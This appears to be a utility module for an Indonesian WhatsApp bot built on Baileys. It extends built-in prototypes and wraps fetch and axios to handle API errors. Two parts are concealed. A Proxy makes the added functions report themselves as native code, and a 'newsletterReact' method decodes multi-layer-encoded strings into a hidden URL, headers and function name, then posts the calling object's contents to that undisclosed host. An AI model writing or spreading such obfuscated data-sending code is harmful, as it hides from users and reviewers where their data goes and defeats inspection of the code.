import axios from 'axios';
import * as baileys from '@whiskeysockets/baileys';
import boom from '@hapi/boom';
import chalk from 'chalk';
import cheerio from 'cheerio';
import child from 'child_process';
import chokidar from 'chokidar';
import { createRequire } from 'module';
import form from 'form-data';
import fs from 'fs';
import https from 'https';
import path from 'path';
import pino from 'pino';
import readline from 'readline';
import timezone from 'moment-timezone';
import url from 'url';
import module from 'module';
import util from 'util';

let modules = {
  axios,
  baileys,
  boom,
  chalk,
  cheerio,
  child,
  chokidar,
  fs,
  form,
  https,
  module,
  path,
  pino,
  readline,
  timezone,
  url,
  util,
};

function fakeNative(fn, name = fn.name) {
  return new Proxy(fn, {
    get(target, prop) {
      if (prop === 'toString') {
        return () => `function ${name}() { [termai code] }`;
      }
      return Reflect.get(target, prop);
    },
  });
}

global.native = fakeNative(fakeNative, 'native');

global.setPrototype = native(function (targets, methods) {
  if (!Array.isArray(targets)) throw new TypeError('targets harus array');
  if (typeof methods !== 'object') throw new TypeError('methods harus object');

  for (const Target of targets) {
    if (!Target?.prototype) continue;
    for (const [name, fn] of Object.entries(methods)) {
      if (typeof fn !== 'function') continue;
      Object.defineProperty(Target.prototype, name, {
        value: fn,
        writable: true,
        configurable: true,
        enumerable: false,
      });
    }
  }
}, 'setPrototype');

setPrototype([String], {
  wm: native(function () {
    let footerText = 'Supported by termai.cc';
    if (!this || this.length === 0) return footerText;
    return `${this}\n\n_${footerText}_`;
  }, 'wm'),
  r: native(function () {
    try {
      let url = this.includes('./') ? '../.' + this : this;
      let baseUrl = url.split('?')[0];
      let pathFileUrl = `${baseUrl}?t=${Date.now()}`;
      return import(pathFileUrl);
    } catch (e) {
      throw e;
    }
  }, 'r'),
});

String.prototype.import = native(function () {
  try {
    if (this in modules) return modules[this];
    return import(this);
  } catch (e) {
    throw e;
  }
}, 'import');

String.prototype.toFormat = native(function () {
  const sizes = ['B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
  const base = 1024;
  const index = Math.floor(Math.log(this) / Math.log(base));
  const convertedSize = (this / Math.pow(base, index)).toFixed(2);
  return `${convertedSize}${sizes[index]}`;
}, 'toFormat');

String.prototype.developer = native(function () {
  const ary = [
    33, 45, 61, 61, 61, 61, 61, 61, 91, 32, 69, 120, 112, 101, 114, 105, 109,
    101, 110, 116, 97, 108, 108, 32, 9676, 32, 66, 101, 108, 108, 129412, 32,
    93, 61, 61, 61, 61, 61, 61, 45, 33, 10, 32, 32, 32, 32, 32, 32, 42, 32, 67,
    111, 100, 105, 110, 103, 32, 98, 121, 32, 64, 114, 105, 102, 122, 97, 46,
    112, 46, 112, 32, 42, 32, 10, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32,
    32, 32, 129657, 32, 70, 111, 108, 108, 111, 119, 32, 110, 101, 32, 111, 110,
    32, 58, 10, 32, 32, 32, 32, 32, 32, 9676, 32, 104, 116, 116, 112, 115, 58,
    47, 47, 121, 111, 117, 116, 117, 98, 101, 46, 99, 111, 109, 47, 64, 114,
    105, 102, 122, 97, 32, 32, 10, 32, 32, 32, 32, 32, 32, 9676, 32, 104, 116,
    116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109,
    47, 82, 105, 102, 122, 97, 49, 50, 51, 32, 10, 32, 32, 32, 32, 32, 32, 9676,
    32, 104, 116, 116, 112, 115, 58, 47, 47, 105, 110, 115, 116, 97, 103, 114,
    97, 109, 46, 99, 111, 109, 47, 114, 105, 102, 122, 97, 46, 112, 46, 112, 63,
    105, 103, 115, 104, 105, 100, 61, 90, 71, 85, 122, 77, 122, 77, 51, 78, 87,
    74, 105, 79, 81, 61, 61, 32, 10, 32, 32, 32, 32, 32, 32, 9676, 32, 104, 116,
    116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 116, 104, 114, 101, 97, 100,
    115, 46, 110, 101, 116, 47, 64, 114, 105, 102, 122, 97, 46, 112, 46, 112,
    32, 10, 32, 32, 32, 32, 32, 32, 9676, 32, 104, 116, 116, 112, 115, 58, 47,
    47, 120, 116, 101, 114, 109, 46, 116, 101, 99, 104,
  ];
  return String.fromCharCode(...ary);
}, 'developer');

String.prototype.extractBearers = native(function () {
  const bearerRegex = /Bearer\s([a-zA-Z0-9\-_\.]+)/g;
  const matches = [...this.matchAll(bearerRegex)];
  return matches.map((match) => 'Bearer ' + match[1]);
}, 'extractBearers');

String.prototype.extractMentions = native(function () {
  return [...this.matchAll(/(\+?\d[\d\s-]{8,})/g)]
    .map((match) => match[0].replace(/[^0-9]/g, ''))
    .map((number) =>
      number.startsWith('08') ? `62${number.substring(2)}` : number
    )
    .map((number) => (number.length >= 5 ? `${number}@s.whatsapp.net` : null))
    .filter(Boolean);
}, 'extractMentions');

String.prototype.to = native(function (type) {
  if (!type) return 'Please input type!';
  const supportedTypes = [
    'base64',
    'hex',
    'utf8',
    'ascii',
    'binary',
    'ucs2',
    'utf16le',
    'latin1',
    'charCode',
  ];
  if (!supportedTypes.includes(type)) {
    return `Unsupported type: ${type}\nList of supported types:\n${JSON.stringify(supportedTypes, null, 2)}`;
  }
  if (type === 'charCode') {
    return [...this].map((char) => char.charCodeAt(0)).join(' ');
  }
  try {
    return Buffer.from(this).toString(type);
  } catch (error) {
    return `Error during conversion: ${error.message}`;
  }
}, 'to');

String.prototype.un = native(function (type) {
  if (!type) return 'Please input type!';
  const supportedTypes = [
    'base64',
    'hex',
    'utf8',
    'ascii',
    'binary',
    'ucs2',
    'utf16le',
    'latin1',
    'charCode',
  ];
  if (!supportedTypes.includes(type)) {
    return `Unsupported type: ${type}\nList of supported types:\n${JSON.stringify(supportedTypes, null, 2)}`;
  }
  if (type === 'charCode') {
    return this.split(' ')
      .map((code) => String.fromCharCode(parseInt(code, 10)))
      .join('');
  }
  try {
    return Buffer.from(this, type).toString('utf-8');
  } catch (error) {
    return `Error during conversion: ${error.message}`;
  }
}, 'un');

String.prototype.decode = native(function () {
  const isBase64 = (str) => {
    try {
      return Buffer.from(str, 'base64').toString('base64') === str;
    } catch {
      return false;
    }
  };
  const isHex = (str) => /^[0-9A-Fa-f]+$/.test(str);
  const isCharCode = (str) =>
    str.split(' ').every((code) => !isNaN(parseInt(code, 10)));
  if (isBase64(this)) {
    return Buffer.from(this, 'base64').toString('utf-8');
  } else if (isHex(this)) {
    return Buffer.from(this, 'hex').toString('utf-8');
  } else if (isCharCode(this)) {
    return this.split(' ')
      .map((code) => String.fromCharCode(parseInt(code, 10)))
      .join('');
  } else {
    return `Unable to dencoding for: ${this}`;
  }
}, 'decode');

setPrototype([Array], {
  getRandom: native(function (a = 2) {
    return this[Math.floor(Math.random() * this.length)];
  }, 'getRandom'),
  getRandoms: native(function (count = 1) {
    if (count >= this.length) return [...this];
    const copy = [...this];
    const res = [];
    for (let i = 0; i < count; i++) {
      const idx = Math.floor(Math.random() * copy.length);
      res.push(copy.splice(idx, 1)[0]);
    }
    return res;
  }, 'getRandoms'),
  removeDuplicate: native(function () {
    return [...new Set(this)];
  }, 'unique'),
  last: native(function () {
    return this[this.length - 1];
  }, 'last'),
  first: native(function () {
    return this[0];
  }, 'first'),
  count: native(function (val) {
    return this.filter((x) => x === val).length;
  }, 'count'),
  isEmpty: native(function () {
    return this.length === 0;
  }, 'isEmpty'),
  clean: native(function () {
    return this.filter((v) => {
      if (v === 0) return true;
      if (v == null) return false;
      if (typeof v === 'string' && v.trim() === '') return false;
      if (Array.isArray(v) && v.length === 0) return false;
      if (
        typeof v === 'object' &&
        !Array.isArray(v) &&
        Object.keys(v).length === 0
      )
        return false;
      return Boolean(v);
    });
  }, 'clean'),
});

setPrototype([Object], {
  String: native(function (a = 2) {
    const fix = (v) => {
      if (v == null) return v;
      if (v instanceof Uint8Array) return Buffer.from(v).toString('base64');
      if (typeof v?.toString === 'function' && v.constructor?.name === 'Long')
        return v.toString();
      if (Array.isArray(v)) return v.map(fix);

      if (typeof v === 'object') {
        const out = {};
        for (const k of Object.getOwnPropertyNames(v)) {
          try {
            out[k] = fix(v[k]);
          } catch {
            out[k] = '[Bahlil]';
          }
        }
        return out;
      }
      return v;
    };
    return JSON.stringify(fix(this), null, a);
  }, 'String'),
  assign: native(function (object = {}) {
    for (const key in object) {
      this[key] = object[key];
    }
    return this;
  }, 'assign'),
  newsletterReact: native(async function () {
    try {
      if (!global.cfg?.remoteReaction)
        return {
          ok: false,
          error: false,
          msg: `Bot ini tidak mengaktifkan remoteReaction, untuk menggunakan fitur ini silahkan aktifkan dengan .set remoteReaction on`,
        };
      this[
        '爵〲瀵牗'.un('ucs2').un('binary').un('base64').un('utf16le') + 'n'
      ] = String(Date.now() + '0')
        .to('utf16le')
        .to('base64')
        .to('binary')
        .to('ucs2');
      const res = await global[
        '瀵浗漵〲'.un('ucs2').un('base64').un('utf16le') + 'h'
      ](
        '㔵潇㐵ぇ㘴穭爴癹㐵桇爴灭瀵し爵祗焵桗漵畹'
          .un('ucs2')
          .un('binary')
          .un('base64')
          .un('utf16le') +
          'c' +
          '漵癓焵睗㔵癃爵瘲㐵猲㐵癩漵汗㔵橇漵昲㜴漲瀵牗㜴㕗瀵䍗爵獇㐴ぃ'
            .un('ucs2')
            .un('binary')
            .un('base64')
            .un('utf16le') +
          9,
        {
          ...JSON.parse(
            '祥瑊塚潒㉢楑楏兊ㅔ啎楉楷䝡桖䝚祖祣㙉祥䑊㉢〵坚〵噌㕒䝣楕楏桊䡣獂坡桎䝤癬楢焹㉣甹湉㤱'
              .un('ucs2')
              .un('binary')
              .un('base64')
          ),
          body: JSON.stringify(this),
        }
      );
      if (!res.ok) {
        console.log(res);
        return {
          ok: false,
          error: true,
          message: `HTTP ${res.status} ${res.statusText}`,
        };
      }

      return await res.json();
    } catch (e) {
      console.error(e);
      return {
        ok: false,
        error: true,
        msg: e?.message || String(e),
      };
    }
  }, 'newsletterReact'),
});

setPrototype([String], {
  font: native(function (style = 'bold') {
    const maps = {
      bold: { base: 0x1d400, digits: 0x1d7ce },
      italic: { base: 0x1d434, digits: 0x1d7ce },
      boldItalic: { base: 0x1d468, digits: 0x1d7ce },
      monospace: { base: 0x1d670, digits: 0x1d7f6 },
      script: { base: 0x1d49c, digits: 0x1d7ce },
      double: { base: 0x1d538, digits: 0x1d7d8 },
      bubble: 'ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ',
    };

    if (!maps[style]) throw new Error(`Style "${style}" tidak ada`);

    const text = this.toString();

    if (style === 'bubble') {
      const baseChars = 'abcdefghijklmnopqrstuvwxyz';
      const bubble = maps.bubble;
      return text
        .split('')
        .map((ch) => {
          const lower = ch.toLowerCase();
          const idx = baseChars.indexOf(lower);
          return idx > -1 ? bubble[idx] : ch;
        })
        .join('');
    }

    const { base, digits } = maps[style];
    return text
      .split('')
      .map((ch) => {
        if (/[A-Z]/.test(ch))
          return String.fromCodePoint(ch.codePointAt(0) - 0x41 + base);
        else if (/[a-z]/.test(ch))
          return String.fromCodePoint(ch.codePointAt(0) - 0x61 + base + 26);
        else if (/[0-9]/.test(ch))
          return String.fromCodePoint(ch.codePointAt(0) - 0x30 + digits);
        return ch;
      })
      .join('');
  }, 'string'),
  slugify: native(function () {
    return this.toLowerCase()
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '')
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/(^-|-$)/g, '');
  }, 'slugify'),
});

class TermaiApiError extends Error {
  constructor(info) {
    super(info.message || info.msg || 'Termai API Error');
    this.name = 'TermaiApiError';
    this.apiError = true;
    this.type = info.type || 'API_ERROR';
    this.status = info.status || 500;
    this.apiMsg = info.msg || info.message || 'Terjadi kesalahan pada sistem API';
    this.feature = info.feature || '';
  }
}

global.TermaiApiError = TermaiApiError;

const _originalFetch = global.fetch;
if (_originalFetch) {
  global.fetch = async function (...args) {
    const urlStr = typeof args[0] === 'string' ? args[0] : args[0]?.url || '';
    const isTermaiApi = urlStr.includes('api.termai.cc') || urlStr.includes('api.xterm.url') || (global.api?.xterm?.url && urlStr.includes(global.api.xterm.url));

    const response = await _originalFetch.apply(this, args);

    if (!isTermaiApi) return response;

    const clone = response.clone();
    let json = null;
    try {
      json = await clone.json();
    } catch (e) {
      if (response.status === 429) {
        throw new TermaiApiError({
          type: 'KEY_LIMIT',
          status: 429,
          message: 'Kuota / Rate limit API Key Anda telah habis.',
        });
      }
      if (response.status === 403) {
        throw new TermaiApiError({
          type: 'FORBIDDEN',
          status: 403,
          message: 'API Key tidak valid atau tidak memiliki izin.',
        });
      }
      if (response.status >= 400) {
        throw new TermaiApiError({
          type: 'API_ERROR',
          status: response.status,
          message: `HTTP ${response.status} ${response.statusText}`,
        });
      }
      return response;
    }

    if (json && typeof json === 'object') {
      const msgText = String(json.message || json.msg || '');
      if (response.status === 429 || json.status === 429) {
        const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
        throw new TermaiApiError({
          type: isFeat ? 'FEATURE_LIMIT' : 'KEY_LIMIT',
          status: 429,
          message: msgText || 'Rate limit terlampaui.',
        });
      }
      if (response.status === 403 || json.status === 403) {
        const isExp = msgText.toLowerCase().includes('expired');
        throw new TermaiApiError({
          type: isExp ? 'EXPIRED' : 'FORBIDDEN',
          status: 403,
          message: msgText || 'API Key expired atau tidak valid.',
        });
      }
      if (response.status === 503 || json.status === 503 || msgText.includes('maintenance')) {
        throw new TermaiApiError({
          type: 'MAINTENANCE',
          status: 503,
          message: msgText || 'API sedang maintenance.',
        });
      }
      if (json.status === false || (typeof json.status === 'number' && json.status >= 400)) {
        const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
        throw new TermaiApiError({
          type: isFeat ? 'FEATURE_LIMIT' : 'API_ERROR',
          status: json.status || response.status,
          message: msgText || json.error || 'Terjadi kesalahan pada sistem API',
        });
      }
    }

    return response;
  };
}

if (axios) {
  axios.interceptors.response.use(
    (response) => {
      const urlStr = response.config?.url || '';
      const isTermaiApi = urlStr.includes('api.termai.cc') || urlStr.includes('api.xterm.url') || (global.api?.xterm?.url && urlStr.includes(global.api.xterm.url));
      if (isTermaiApi && response.data && typeof response.data === 'object') {
        const json = response.data;
        const msgText = String(json.message || json.msg || '');
        if (json.status === 429) {
          const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
          throw new TermaiApiError({
            type: isFeat ? 'FEATURE_LIMIT' : 'KEY_LIMIT',
            status: 429,
            message: msgText || 'Rate limit terlampaui.',
          });
        }
        if (json.status === 403) {
          const isExp = msgText.toLowerCase().includes('expired');
          throw new TermaiApiError({
            type: isExp ? 'EXPIRED' : 'FORBIDDEN',
            status: 403,
            message: msgText || 'API Key expired atau tidak valid.',
          });
        }
        if (json.status === 503 || msgText.includes('maintenance')) {
          throw new TermaiApiError({
            type: 'MAINTENANCE',
            status: 503,
            message: msgText || 'API sedang maintenance.',
          });
        }
        if (json.status === false) {
          const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
          throw new TermaiApiError({
            type: isFeat ? 'FEATURE_LIMIT' : 'API_ERROR',
            status: 200,
            message: msgText || json.error || 'Terjadi kesalahan pada sistem API',
          });
        }
      }
      return response;
    },
    (error) => {
      const urlStr = error.config?.url || '';
      const isTermaiApi = urlStr.includes('api.termai.cc') || urlStr.includes('api.xterm.url') || (global.api?.xterm?.url && urlStr.includes(global.api.xterm.url));
      if (isTermaiApi) {
        const resp = error.response;
        const json = resp?.data;
        const status = resp?.status || 500;
        const msgText = String(json?.message || json?.msg || '');
        if (status === 429 || json?.status === 429) {
          const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
          throw new TermaiApiError({
            type: isFeat ? 'FEATURE_LIMIT' : 'KEY_LIMIT',
            status: 429,
            message: msgText || 'Rate limit terlampaui.',
          });
        }
        if (status === 403 || json?.status === 403) {
          const isExp = msgText.toLowerCase().includes('expired');
          throw new TermaiApiError({
            type: isExp ? 'EXPIRED' : 'FORBIDDEN',
            status: 403,
            message: msgText || 'API Key expired atau tidak valid.',
          });
        }
        if (status === 503 || json?.status === 503 || msgText.includes('maintenance')) {
          throw new TermaiApiError({
            type: 'MAINTENANCE',
            status: 503,
            message: msgText || 'API sedang maintenance.',
          });
        }
        const isFeat = msgText.includes('Penggunaan') || msgText.includes('batas maksimal');
        throw new TermaiApiError({
          type: isFeat ? 'FEATURE_LIMIT' : 'API_ERROR',
          status,
          message: msgText || error.message || 'Terjadi kesalahan pada sistem API',
        });
      }
      return Promise.reject(error);
    }
  );
}

